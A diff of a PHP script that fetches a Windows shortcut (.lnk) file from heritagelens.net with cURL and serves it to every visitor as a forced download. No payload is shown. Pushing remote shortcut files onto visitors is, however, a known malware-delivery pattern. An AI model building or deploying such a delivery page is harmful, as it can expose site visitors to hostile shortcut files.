@@ -1,17 +1,14 @@
 <?php
-$file = 'https://www.heritagelens.net/HeritageLensAlliance.lnk';
+$fileUrl = 'https://www.heritagelens.net/HeritageLensAlliance.lnk';
 
-// Make sure the file exists
-if (file_exists($file)) {
-    // Set headers to force download
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="HeritageLensAlliance.lnk"');
-    header('Content-Length: ' . filesize($file));
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="HeritageLensAlliance.lnk"');
 
-    // Send the file content to the browser
-    readfile($file);
-    exit;
-} else {
-    echo "File not found.";
-}
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $fileUrl);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$data = curl_exec($ch);
+curl_close($ch);
+
+echo $data;
 ?>
